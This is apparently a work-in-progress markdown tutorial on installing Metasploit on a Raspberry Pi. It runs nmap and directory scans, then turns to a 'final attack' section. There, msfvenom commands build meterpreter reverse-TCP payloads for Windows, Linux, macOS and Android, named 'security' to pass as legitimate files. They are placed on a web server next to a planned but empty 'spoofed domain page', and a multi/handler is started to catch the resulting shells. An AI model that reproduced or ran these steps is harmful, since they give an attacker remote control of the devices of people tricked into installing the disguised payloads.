# Metasploit

... work in progress ...

## Objective

The aim of this tutorial is to install Metasploit on Raspberry PI and to provide a tiny introduction.

## Install needed and/or optional packages

Install (_or ensure they are installed_) following packages.

```shell
# update system (optional)
$ sudo apt update -y && sudo apt upgrade -y

# install optional packages (optional)
$ sudo apt install -y vim tree

# install needed packages
$ sudo apt install -y curl nmap
```

## Preparation

For the Metasploit (_first steps_) section and the Metaslpoit/Msfvenom (_final attack_) sections, you can create already some folders.

```shell
# create some directories
$ mkdir /var/www/html/{images,styles,scripts,data}
```

## Install and start Metasploit

```shell
# download latest install script
$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall

# change file permissions
$ chmod u+x msfinstall

# start installation
$ sudo ./msfinstall

# start msfconsole
$ msfconsole
```

Start the initial msfconsole (_incl. Metasploit version_), this will also setup your database.

```
Would you like to use and setup a new database (recommended)? y
Initial MSF web service account username? [pi]:
Initial MSF web service account password? (Leave blank for random password):
```

Please store this credentials!!!

## Metasploit (_first steps_)

```shell
# add workspace (and switch)
msf6 > workspace -a first-steps

# executes nmap scan
msf6 > db_nmap 192.168.0.1/24

# list all hosts in the database
msf6 > hosts

# list all services in the database
msf6 > services

# exit msf console
msf6 > exit

# search for available http auxiliaries (optional)
msf6 > search auxiliary name:http

# enable directory scanner
msf6 > use auxiliary/scanner/http/dir_scanner

# show options
msf6 auxiliary(scanner/http/dir_scanner) > options

# set RHOST value
msf6 auxiliary(scanner/http/dir_scanner) > set RHOSTS 192.168.0.1

# run scanner
msf6 auxiliary(scanner/http/dir_scanner) > run
...
[+] Found http://192.168.0.1:80/data/ 404 (192.168.0.1)
[+] Found http://192.168.0.1:80/images/ 404 (192.168.0.1)
[+] Found http://192.168.0.1:80/styles/ 404 (192.168.0.1)
...

# exit msfconsole
msf6 auxiliary(scanner/http/dir_scanner) > quit
```

## Metaslpoit/Msfvenom (_final attack_)

### Generate some exploits

Okay, let's make the hands dirty.

```shell
# start msfconsole (without banner)
$ msfconsole -L

# search for reverse tcp
msf6 > search meterpreter_reverse_tcp

# create payload for Windows
msf6 > msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe > /var/www/html/data/security.exe

# create payload for Linux
msf6 > msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > /var/www/html/data/security.elf

# create payload for macOS
msf6 > msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f macho > /var/www/html/data/security.dmg

# create payload for Android
msf6 > msfvenom -p android/meterpreter_reverse_tcp -o /var/www/html/data/security.apk LHOST=192.168.0.1 LPORT=4444

# show directory structure (optional)
msf6 > tree /var/www/html/data/
├── security.apk
├── security.dmg
├── security.elf
└── security.exe
```

### Prepare the spoofed domain page

...

```html
```

...

```css
```

...

```javascript
```

### Start connection handler

...

```shell
# use multi/handler
msf6 > > use exploit/multi/handler

# show informations (optional)
msf6 exploit(multi/handler) > info

# show options (optional)
msf6 exploit(multi/handler) > options

# set lhost
msf6 exploit(multi/handler) > set LHOST 192.168.0.1

# start multi/handler
msf6 exploit(multi/handler) > run
```


[Go Back](./README.md)
